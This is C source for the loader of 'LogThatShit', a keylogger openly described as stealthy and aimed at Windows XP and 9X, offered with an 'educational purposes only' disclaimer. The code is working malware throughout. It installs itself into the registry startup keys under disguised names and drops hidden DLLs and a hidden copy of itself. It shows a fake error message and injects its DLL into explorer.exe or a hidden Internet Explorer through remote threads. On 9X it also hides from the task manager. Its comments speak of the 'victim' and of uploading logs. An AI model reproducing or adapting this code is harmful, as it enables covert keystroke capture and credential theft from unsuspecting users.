
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.





#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <time.h> 
#include <windows.h> 
#include <tlhelp32.h>
#include "Stub.h" 
#include "Common.h" 
#include "Settings.h" 

#define RAN_ON_BOOT_FLAG "/s" 
char injectdll[MAX_PATH+1]; 
char path2me[MAX_PATH+1]; 
char rootpath[MAX_PATH+1]; 
char* block; 
char* errmsg; 
char* errcap; 
LTSData data; 


OS_PLATFORM GetPlatform() { 
	/* Get the operating system's platform, 9X or NT. */ 
	OSVERSIONINFO info; 
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionEx(&info))  return (info.dwPlatformId==VER_PLATFORM_WIN32_NT) ? PLAT_NT : PLAT_9X; 
	WIN_ERR("Unable to get platform."); 
	return PLAT_ERROR; 
} 


int GetDefaultBrowser(char* buf, DWORD* sz) { 
	/* Get path to the default browser. Returns 1 on failure. */ 
#define REG_KEY_DEFAULT_BROWSER "HTTP\\shell\\open\\command" 
	HKEY hkey; 
	if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_CLASSES_ROOT, REG_KEY_DEFAULT_BROWSER, 0, KEY_READ, &hkey)) 
		return 1; 

	if (ERROR_SUCCESS != RegQueryValueEx(hkey, 0, 0, 0, buf, sz)) { 
		RegCloseKey(hkey); 
		return 1; 
	} 

	RegCloseKey(hkey); 
	return 0; 
} 


int ImplementRunStartup() { 
	/* This is used on 9X and if ActiveX startup fails to be implemented on NT. */ 
#define RUN_LIKE_HELL "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" 
	HKEY hkey; 
	char pathandflag[MAX_PATH]; 

	/* Open the key. */ 
	if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_LOCAL_MACHINE, RUN_LIKE_HELL, 0, KEY_ALL_ACCESS, &hkey)) { 
		WIN_ERR("Failed opening run startup key."); 
		return 1; 
	} 

	/* Set the value. */ 
	snprintf(pathandflag, MAX_PATH, "%s %s", path2me, RAN_ON_BOOT_FLAG); 
	pathandflag[MAX_PATH] = '\0'; 
	if (RegSetValueEx(hkey, "qttask", 0, REG_SZ, pathandflag, strlen(pathandflag))) { 
		WIN_ERR("Failed to set run startup value."); 
		return 1; 
	} 

	/* Close the key. */ 
	RegCloseKey(hkey); 
	return 0; 
} 


int ImplementDefaultStartup() { 
	/*	We create a key in HKLM/.../Installed_tttponents, after the initial startup, a key 
		with the same name is created in HKCU/.../Installed_tttponents. If this key is present, 
		we will NOT startup again. We need to remove this key but it gets created _after_ 
		we are launched. */ 
	HKEY hkey; 
	DWORD disp;
	DWORD sz; 
	FILETIME fuck; 
	char pathandflag[MAX_PATH]; 
	char key[MAX_PATH]; 
	char sub[255]; 
	int a, b, c; 
	int found; 
#define REG_STARTUP_PATTERN "{3b911tHr34t-9A" 
#define ACTIVEX_REG_KEY "SOFTWARE\\Microsoft\\Active Setup\\Installed_tttponents\\" 

	/*	We do not want to make a mess in the registry, So let's get rid of the previous key we 
		created. All keys we create will start with REG_STARTUP_PATTERN. First get rid of all 
		the keys we created in HKLM. */ 
	if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE, ACTIVEX_REG_KEY, 0, KEY_ALL_ACCESS, &hkey)) { 
		for(a=0;;) { 
			sz = 255; 
			disp = RegEnumKeyEx(hkey, a++, sub, &sz, 0, 0, 0, &fuck); 
			if (ERROR_SUCCESS!=disp) { 
				if (ERROR_NO_MORE_ITEMS==disp) break; 
			} 

			/*_tttpare the key to our wildcard. Delete it if it matches. */ 
			if (!strncmp(sub, REG_STARTUP_PATTERN, 15)) RegDeleteKey(hkey, sub); 
		} 
	} 
#ifdef DEBUG_MODE 
	else { WIN_ERR("Unable to open key for enumeration."); } 
#endif 

	/* Then all the keys that Windows creates in HKCU */ 
	if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_CURRENT_USER, ACTIVEX_REG_KEY, 0, KEY_ALL_ACCESS, &hkey)) { 
		for(a=0;;) { 
			sz = 255; 
			disp = RegEnumKeyEx(hkey, a++, sub, &sz, 0, 0, 0, &fuck); 
			if (ERROR_SUCCESS!=disp) { 
				if (ERROR_NO_MORE_ITEMS==disp) 
					break; 
			} 

			/*_tttpare the key to our wildcard. Delete it if it matches. */ 
			if (!strncmp(sub, REG_STARTUP_PATTERN, 15)) RegDeleteKey(hkey, sub); 
		} 
	} 
#ifdef DEBUG_MODE 
	else {
		WIN_ERR("Unable to open key for enumeration."); 
	} 
#endif 

	/* Now create the new key and set the StubPath to point to us. */ 

	/* Seed, we will be generating some random ints. */ 
	srand((unsigned int)time(0)); 

	/* Keep constructing a key name until a unique one is found. */ 
	found = 0; 
	while (!found) { 
		/* Generate 3 ints (0-99) to use to create the random key. We can likey get away with 2 ints, but fuck it. */ 
		a = (rand() % 100); 
		b = (rand() % 100); 
		c = (rand() % 100); 

		snprintf(key, MAX_PATH, ACTIVEX_REG_KEY REG_STARTUP_PATTERN "%dEC%d-bc5-00%.2d%.2d%d%dE%dC}", a, c, b, c, c, b, a); 
		key[MAX_PATH] = '\0'; 

		/* Does it exist already? */ 
		switch (RegOpenKeyEx(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey)) { 
			case ERROR_SUCCESS: 
				/* Exists. Keep looking. */ 
				RegCloseKey(hkey); 
				break; 

			case ERROR_INVALID_HANDLE: 
			case ERROR_FILE_NOT_FOUND: 
			case ERROR_BAD_PATHNAME: 
				/* Does not exist. Use this key. */ 
				found = 1; 
				break; 
		} 
	} 

	/* Create the new key. */ 
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, key, 0, 0, REG_OPTION_NON_VOLATILE, KEY_WRITE, 0, &hkey, &disp)) { 
		WIN_ERR("Failed creating activeX startup key."); 
		return 1; 
	} 

	/* Set the value of StubPath. */ 
	snprintf(pathandflag, MAX_PATH, "%s %s", path2me, RAN_ON_BOOT_FLAG); 
	pathandflag[MAX_PATH] = '\0'; 
	if (RegSetValueEx(hkey, "StubPath", 0, REG_SZ, pathandflag, strlen(pathandflag))) {
		WIN_ERR("Failed setting activeX StubPath value."); 
		return 1; 
	} 

	/* Success. */ 
	RegCloseKey(hkey); 
	return 0; 
} 


DWORD run(const char* const path, char hide) { 
	/* Run path using CreateProcess() */ 
	STARTUPINFO startup; 
	PROCESS_INFORMATION proc; 

	ZeroMemory(&startup, sizeof(startup)); 
	startup.cb = sizeof(startup); 
	if (hide) { 
		startup.dwFlags = STARTF_USESHOWWINDOW; 
		startup.wShowWindow = SW_HIDE; 
	} 

	if (CreateProcess(path,0,0,0,0,0,0,0,&startup,&proc)) 
		return proc.dwProcessId; 
	WIN_ERR("Create process failed."); 
	return 0; 
} 


int Inject(const char* const dll, DWORD pid) {
	HANDLE process;
	DWORD written;
	DWORD* parms;
	HANDLE Thread;
	DWORD tID;
	FARPROC pLoadLibrary; 
	FARPROC pWriteProcessMemory; 
	FARPROC pCreateRemoteThread; 

	/* Open the process that we plan on injecting into. */ 
	process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	if (!process) { 
		WIN_ERR("OpenProcess() on passed pID failed.");
		return 1; 
	} 

	/* Allocate space for the DLL. */ 
	parms = VirtualAllocEx(process, 0, 4096, MEM_tttMIT, PAGE_READWRITE);
	if (!parms) { 
		WIN_ERR("VirtualAllocEx has failed."); 
		CloseHandle(process); 
		return 1; 
	} 

	/* Write the DLL filename to the allocated space. */ 
	pWriteProcessMemory = GetProcAddress(GetModuleHandle("Kernel32.dll"), "WriteProcessMemory");
	if (!pWriteProcessMemory) { 
		WIN_ERR("Getting address of WriteProcessMemoryA failed.");
		VirtualFreeEx(process, parms, 0, MEM_RELEASE); 
		CloseHandle(process); 
		return 1; 
	} 

	if (!pWriteProcessMemory(process, parms, dll, 4096, &written)) { 
		WIN_ERR("WriteProcessMemory failed.");
		VirtualFreeEx(process, parms, 0, MEM_RELEASE); 
		CloseHandle(process); 
		return 1; 
	} 

	pLoadLibrary = GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
	if (!pLoadLibrary) { 
		WIN_ERR("GetProcAddr() failed");
		VirtualFreeEx(process, parms, 0, MEM_RELEASE); 
		CloseHandle(process); 
		return 1; 
	} 

	/* Create a remote thread into the target process and have it load our DLL. */ 
	pCreateRemoteThread = GetProcAddress(GetModuleHandle("Kernel32.dll"), "CreateRemoteThread");
	if (!pCreateRemoteThread) { 
		WIN_ERR("Getting address of CreateRemoteThreadA failed.");
		VirtualFreeEx(process, parms, 0, MEM_RELEASE); 
		CloseHandle(process); 
		return 1; 
	} 

	Thread = (HANDLE)pCreateRemoteThread(process, 0, 0, (LPTHREAD_START_ROUTINE) pLoadLibrary, parms, 0, &tID);
	if (!Thread) { 
		WIN_ERR("CreateRemoteThread got fUCKed.");
		VirtualFreeEx(process, parms, 0, MEM_RELEASE); 
		CloseHandle(process); 
		return 1; 
	} 

	/* We need to wait for thread proc to start before cleaning up, else it will be terminated. */ 
	WaitForSingleObject(Thread, MUTEX_WAIT_MS); 

	/* Clean up. */ 
	VirtualFreeEx(process, parms, 0, MEM_RELEASE); 
	CloseHandle(Thread); 
	CloseHandle(process); 
	return 0; 
} 


DWORD InjectionProcessId(const char* const process, PROC_TYPE type) {
	/*	We need to get a process ID to inject into it. We can either inject into a 
	 	running process such as Explorer.exe or we can stealthly spawn a process and 
		use that. process name is NOT case sensitive. */ 

	/* XXX PSAPI works in NT/XP/2K. Toolhelp32 doesn't work in NT. */ 
	if (RUNNING==type) { 
		int i; 
		PROCESSENTRY32 pe; 
		HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
		if (!snap) { 
			WIN_ERR("Getting a process snapshot has failed."); 
			return 0; 
		} 

		pe.dwSize = sizeof(PROCESSENTRY32); 
		for (i = Process32First(snap, &pe); i; i=Process32Next(snap, &pe)) { 
			if (0==strcmpi2(process, pe.szExeFile, MAX_PATH)) { 
				/* INFO(pe.szExeFile); */ 
				CloseHandle(snap); 
				return pe.th32ProcessID; 
			} 
		} 

		CloseHandle(snap); 
	} else if (SPAWN==type) { 
		/* run(path, hide) returns the process Id or 0 on failure. */ 
		return run(process, 1); 
	} 

	/* Failed to get pID to use for injection (bad!) */ 
	return 0; 
} 


int LoadSettings(const char* const argv0) { 
	/*	Return 1 on failure, 0 on success. 
	 	Settings are appended to this executable file. Read, and load them into a 
		file mapping so that the DLLS are able to read them. 
		Format of settings: 
		[   -(EXE data)-  ] 
		[		InjectDLL ] 
		[		HookDLL	  ] 
		[		Block	  ] 
		[		Data	  ] 
		[		(LTS)	  ] 
		InjectDLL = Will be the DLL that handles setting the hook, uploading/archiving logs. 
		HookDLL = The actual hook proc that is logging keys to the file. 
		Block = A NUL-terminated block of data holding keys/values which include the victim's 
				alias, path to where we archive logs, etc. This is not a fixed struct because 
				the file names are not a fixed size. We need to dynamically parse them out. 
		Data = A fixed size struct that determines how big the block and DLLs are. This 
				is what we will use to find the offset to the DLLs and block. This also has a 
				flags struct. 
		(LTS)=Last three bytes of the file are 'O' 'K' and 'L' -- The update feature will check to 
		see that this is there before replacing the loader. A small check but it can help in a rare 
		situation where the file got corrupt. 
	 */ 
	FILE* fp; 
	int offset; 
	char* tmp; 

	/* Settings are appended to us, let's get them now by reading ourself. */ 
	fp = fopen(argv0, "rb"); 
	if (!fp) { 
		WIN_ERR("Unable to open myself to read settings."); 
		return 1; 
	} 

	/* Check the last 3 bytes, make sure the signature is there. */ 
	fseek(fp, -3, SEEK_END); 
	if (!('L'==fgetc(fp) && 'T'==fgetc(fp) && 'S'==fgetc(fp))) { 
		GEN_ERR("This EXE does not have our signature. Possibly corrupt.\nNot going to attempt reading settings."); 
		fclose(fp); 
		return 1; 
	} 

	/*	Get the LTSData struct, this contains sizes which we will use to get the offset of 
		everything else. */ 
	offset = 3 + sizeof(LTSData); 
	fseek(fp, -offset, SEEK_END); 
	fread(&data, sizeof(LTSData), 1, fp); 

	/* Get block of key/value pairs (settings). Start by allocating space for it. */ 
	block = malloc(data.blocksz); 
	if (!block) { 
		WIN_ERR("Unable to allocate memory for block. Quitting."); 
		fclose(fp); 
		return 1; 
	} 

	offset += data.blocksz; 
	fseek(fp, -offset, SEEK_END); 
	fread(block, 1, data.blocksz, fp); 

	/* We will be using the root path a lot. So keep hold of it for now. */ 
	tmp = SettingsGetValue(block, data.blocksz, "PATH"); 
	if (!tmp) { 
		GEN_ERR("Unable to get root path. Going to use .../system32/"); 
		strncpy(rootpath, "C:\\Windows\\System32\\", MAX_PATH); 
	} 
	strncpy(rootpath, tmp, MAX_PATH); 
	rootpath[MAX_PATH] = '\0'; 
	free(tmp); 

	/* We need the path to where we will reside ASAP to implement startup. */ 
	tmp = SettingsGetValue(block, data.blocksz, "FILENAME"); 
	snprintf(path2me, MAX_PATH, "%s/%s", rootpath, tmp); 
	free(tmp); 

	/* Check if we should display a fake error. */ 
	tmp = SettingsGetValue(block, data.blocksz, "FAKEERROR"); 
	if (tmp && tmp[0]=='1') { 
		errmsg = SettingsGetValue(block, data.blocksz, "ERRMSG"); 
		errcap = SettingsGetValue(block, data.blocksz, "ERRCAP"); 
		free(tmp); 
	} 

	fclose(fp); 
	return 0; 
} 


int Installation(const char* const argv0) { 
	/* Output the DLL files required for Injection and system-wide hook. */ 
	HANDLE mm; 
	int offset; 
	FILE *fp; 
	FILE *fp2; 
	char* tmp; 
	char* dll; 
	char path[MAX_PATH+1]; 
	char* p; 

	/* DLLs are appended to us, let's get them now by reading ourself. */ 
	fp = fopen(argv0, "rb"); 
	if (!fp) {
		WIN_ERR("Opening ourself to output DLLs has failed."); 
		return 1; 
	} 

	/* Output the injection DLL. */ 
	offset = 3 + sizeof(LTSData) + data.blocksz + data.hooksz + data.injectsz; 
	fseek(fp, -offset, SEEK_END); 

	/* Allocate space for injection dll */ 
	dll = malloc(data.injectsz); 
	if (!dll) { 
		WIN_ERR("Unable to allocate memory for injection DLL."); 
		fclose(fp); 
		return 1; 
	} 

	/* Copy DLL from EXE to memory. */ 
	fread(dll, 1, data.injectsz, fp); 

	/* Construct the injection DLL name. It will go in a global variable, as we need it later on. */ 
	tmp = SettingsGetValue(block, data.blocksz, "INJECTNAME"); 
	snprintf(injectdll, MAX_PATH, "%s/%s", rootpath, tmp); 
	injectdll[MAX_PATH] = '\0'; 
	free(tmp); 

	/* Why does it sometimes fail to overwrite? Just in case, manually remove the old one. */ 
	remove(injectdll); 
	fp2 = fopen(injectdll, "wb"); 
	if (fp2) { 
		/* File is open, output DLL from memory to disk. */ 
		fwrite(dll, 1, data.injectsz, fp2); 
		fclose(fp2); 

		/* Make the DLL hidden. */ 
		SetFileAttributes(injectdll, FILE_ATTRIBUTE_HIDDEN); 
	} 
#ifdef DEBUG_MODE 
	else {WIN_ERR("Unable to open file to output Injection DLL to.\nFile likely in use.\nWill attempt to use the existing one.");} 
#endif 

	/* Failed to output DLL or not, free the memory. */ 
	free(dll); 

	/* Output the hook DLL. Allocate space for it in memory. */ 
	dll = malloc(data.hooksz); 
	if (!dll) { 
		WIN_ERR("Unable to allocate memory for hook DLL."); 
		fclose(fp); 
		return 1; 
	} 

	/* Copy from disk to memory. */ 
	fread(dll, 1, data.hooksz, fp); 

	/* Construct the DLL name. */ 
	tmp = SettingsGetValue(block, data.blocksz, "HOOKNAME"); 
	snprintf(path, MAX_PATH, "%s/%s", rootpath, tmp); 
	path[MAX_PATH] = '\0'; 
	free(tmp); 

	remove(path); 
	fp2 = fopen(path, "wb"); 
	if (fp2) { 
		/* Copy from memory to disk. */ 
		fwrite(dll, 1, data.hooksz, fp2); 

		/* Close fp2 (Hook DLL) */ 
		fclose(fp2); 

		/* Make the DLL hidden. */ 
		SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN); 
	} 
#ifdef DEBUG_MODE 
	else {WIN_ERR("Unable to open file to output hook DLL to.\nFile likely in use.\nWill attempt to use the existing one.")}; 
#endif 

	/* Failed to output DLL or not, free the memory and close the file */ 
	free(dll); 
	fclose(fp); 

	/* Write the flag struct to a memory mapped buffer so the hook DLL can get access to it. */ 
	mm = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, sizeof(LTSFlags), LTS_MMBUF_FLAGS); 
	if (!mm) {
		WIN_ERR("Unable to create file mapping to write flag struct to."); 
		return 1; 
	} 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(LTSFlags)); 
	if (!p) { 
		WIN_ERR("Unable to map a view of mapped buf to write flags."); 
		return 1; 
	} 

	CopyMemory(p, &data.flags, sizeof(LTSFlags)); 
	UnmapViewOfFile(p); 

	/* Write the settings block (and size) to a memory mapped buffer so the injection DLL can get access to it. */ 

	/* Start by writing the size of the block. */ 
	mm = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, sizeof(data.blocksz), LTS_MMBUF_BLOCK_SZ); 
	if (!mm) { 
		WIN_ERR("Unable to create file mapping for settings block size."); 
		return 1; 
	} 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(data.blocksz)); 
	if (!p) { 
		WIN_ERR("Unable to map a view of file mapping to write block size."); 
		return 1; 
	} 

	CopyMemory(p, &data.blocksz, sizeof(data.blocksz)); /* Copy the size first. */ 
	UnmapViewOfFile(p); 

	/* and then the block itself. */ 
	mm = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, data.blocksz, LTS_MMBUF_BLOCK); 
	if (!mm) { 
		WIN_ERR("Unable to create file mapping for block."); 
		return 1; 
	} 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, data.blocksz); 
	if (!p) { 
		WIN_ERR("Unable to map a view of file mapping to write block."); 
		return 1; 
	} 

	CopyMemory(p, block, data.blocksz); 
	UnmapViewOfFile(p); 

	/* Done with this. We have all the settings. Free it. */ 
	free(block); 
	return 0; 
} 


int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR argv, int show) { 
	char me[MAX_PATH+1]; 
	HANDLE m; 
	FARPROC pCopyFile; 
	OS_PLATFORM platform; 
	char ranbyuser; 

	/* Look for a commandline flag indicating if we ran via Windows startup. */ 
	if (!strcmpi2(argv, RAN_ON_BOOT_FLAG, strlen(RAN_ON_BOOT_FLAG))) { 
		ranbyuser = 0; 
	} else { 
		ranbyuser = 1; 
	} 

	/* Let's get the path to ourself. */ 
	GetModuleFileName(0, me, MAX_PATH); 
	me[MAX_PATH] = '\0'; 

	/* Stop annoying warning. */ 
#ifdef DEBUG_MODE 
	inst = prev = 0; 
	argv = 0; 
	show = 0; 
#endif 

	/* We mainly need path2me. Let's load it now. */ 
	if (LoadSettings(me)) { 
		GEN_ERR("LoadSettings() returned an error, not going to bother going on. Quitting."); 
		return 1; 
	} 

	/* Get the platform we are running on. */ 
	platform = GetPlatform(); 

	/* Implement startup method. */ 
	if (PLAT_9X != platform) { 
		/* If ActiveX startup fails, use Run startup. (Rare) */ 
		if (ImplementDefaultStartup()) ImplementRunStartup(); 
	} else { 
		/*	ActiveX works on 9X. But on 9X, we do not terminate, this will halt explorer. */ 
		ImplementRunStartup(); 
	} 

	/*	Copy myself over to a path where we will reside forever. 
		Without remove(), CopyFile() sometimes doesn't overwrite, 
		even though it succeeds, wtf? */ 
	remove(path2me); 
	pCopyFile = GetProcAddress(GetModuleHandle("Kernel32.dll"), "CopyFileA"); 
	if (pCopyFile) { 
		pCopyFile(me, path2me, 0); 
	} else { 
		WIN_ERR("Could not get address of CopyFileA. Unable to copy ourself to PATH"); 
	} 

	/* Make myself hidden. */ 
	SetFileAttributes(path2me, FILE_ATTRIBUTE_HIDDEN); 

	/* If we are supposed to display a fake error AND we ran via user... */ 
	if (ranbyuser && errmsg) { 
		/* Display a fake error message box. */ 
		MessageBox(0, errmsg, errcap, MB_ICONERROR); 
		free(errmsg); 
		free(errcap); 
	} 

	/* Check to see if I am already running. If so, quit. */ 
	CreateMutex(0, 1, MUTEX_NAME_RUNNING); 
	if (GetLastError()!=ERROR_SUCCESS) { 
		/* If we are NOT able to create the mutex, assume it's because it already exists. */ 
		INFO("An instance of LTS is already running!\nExiting."); 
		/* Clean up from LoadSettings() */ 
		free(block); 
		return 1; 
	} 

	/* Read settings. They are (supposed to be) appended to the LTS executable file. */ 
	if (Installation(me)) { 
		INFO("Due to errors during installation, we will NOT continue."); 
		/* Clean up what LoadSettings() did. */ 
		free(block); 
		return 1; 
	} 

	/*	The rest depends on the OS platform. Let's get that now. If it's NOT 9X OR it 
		IS an error, assume it's NT */ 
	if (PLAT_9X != platform) { 
		HANDLE confirm; 
		unsigned int i; 
		DWORD pid; 
		char success; 

		success = 0; 
		pid = 0; 
		confirm = 0; 

		/* Inject DLL into a process. */ 
#ifdef DEBUG_MODE 
		pid = InjectionProcessId("C:\\Windows\\System32\\calc.exe", SPAWN); 
		if (!pid) {
			GEN_ERR("Getting pID of calc.exe has failed. Going to attempt default browser."); 
		} 
#else 
		/* First target is Explorer. Get the PID */ 
		pid = InjectionProcessId("explorer.exe", RUNNING); 
#endif 

		/* If the pid is valid, Attempt to inject into the process. Otherwise, attempt def browser */ 
		if (pid) { 
			Inject(injectdll, pid); 

			/* Wait for the confirmation mutex to be created by the injection DLL. */ 
			INFO("Stub waiting for confirmation mutex."); 

			/*	Wait 5 seconds (100ms * 50), if we still don't the confirmation mutex. Assume 
		 	the injection failed. */ 
			for (i=0; i<50; ++i) { 
				confirm=OpenMutex(0, 0, MUTEX_NAME_DONE); 
				if (GetLastError()!=ERROR_FILE_NOT_FOUND) { 
					success = 1; 
					break; 
				} 
				Sleep(100); 
			} 
		} 

		/* If we did not get the mutex, attempt to inject into the default browser. */ 
		if (!success) { 
			/* XXX Fix this. Get default browser and spawn it silently. */
/*			char browser[MAX_PATH]; 
			DWORD browsersz=MAX_PATH; 

			GEN_ERR("Injecting into a running Explorer.exe has failed.\nAttempting to spawn and inject into the default browser."); 

			GetDefaultBrowser(browser, &browsersz); 
			pid = InjectionProcessId(browser, SPAWN); 
			pid = InjectionProcessId("c:\\Program Files\\Mozilla Firefox\\firefox.exe", SPAWN); */ 

			/* If we got the PID, use it. Else just use IE. */ 
			GEN_ERR("Injecting into a running Explorer.exe has failed.\nAttempting to spawn and inject into IE."); 
			pid = InjectionProcessId("C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE", SPAWN); 
			if (pid) { 
				Inject(injectdll, pid); 
				/* Now wait for the confirmation mutex again. */ 
				for (i=0; i<50; ++i) { 
					confirm=OpenMutex(0, 0, MUTEX_NAME_DONE); 
					if (GetLastError()!=ERROR_FILE_NOT_FOUND) { 
						success = 1; 
						break; 
					} 
					Sleep(100); 
				} 
			} 

			if (!success) { 
				/*	Injection into default browser has failed as well. This should NEVER happen. 
					Let's just load the DLL manually then. */ 
				HINSTANCE dll; 
				MSG msg; 

				GEN_ERR("Injection into default browser failed. Going to manually load DLL."); 
				dll = LoadLibrary(injectdll); 
					if (!dll) { 
						WIN_ERR("Unable to load DLL! -- Quitting."); 
						return 1; 
				} 

				while (GetMessage(&msg, 0, 0, 0)) { 
					TranslateMessage(&msg); 
					DispatchMessage(&msg); 
				} 
			} 
		} 

		/* We got confirmation that the DLL successfully read the settings. We can now die. */ 
		INFO("Success! Got confirmation mutex. Stub terminating."); 
		CloseHandle(confirm); 
	} else { 
		/* Windows 9X */ 
		HINSTANCE dll; 
		HMODULE kernel32; 
		MSG msg; 

		/* Hide from task manager. (9X ONLY) */ 
		kernel32 = LoadLibrary("Kernel32.dll"); 
		if (kernel32) { 
			FARPROC rsp; 
			rsp = GetProcAddress(kernel32, "RegisterServiceProcess"); 
			if (rsp) rsp(GetCurrentProcessId(), 1); 
			FreeLibrary(kernel32); 
		} 

		/*	We can not inject into a process' address space on 9X.  We *can* 'inject' using a 
		 	hook and LoadLibrary() but for now, let's just manually load the DLL and sit idle. */ 
		dll = LoadLibrary(injectdll); 
		if (!dll) { 
			WIN_ERR("Unable to load injection DLL! -- Quitting."); 
			return 1; 
		} 

		/* This mutex is meant DLL injection, it tells us that the DLL has read the settings. */ 
		for (;;) { 
			m=OpenMutex(0, 0, MUTEX_NAME_DONE); 
			if (GetLastError()!=ERROR_FILE_NOT_FOUND) break; 
			Sleep(200); 
		} 

		/* Unlike on NT w/ DLL injection, we can not terminate. Windows will unload the DLL. */ 
		CloseHandle(m); 

		/* Just sit idle. DLL that we loaded should take care of the rest. */ 
		INFO("Running on 9X. DLL has been loaded. Loader will sit in an idle loop."); 
		while (GetMessage(&msg, 0, 0, 0)) { 
			TranslateMessage(&msg); 
			DispatchMessage(&msg); 
		} 
	} 

	return 0; 
} 



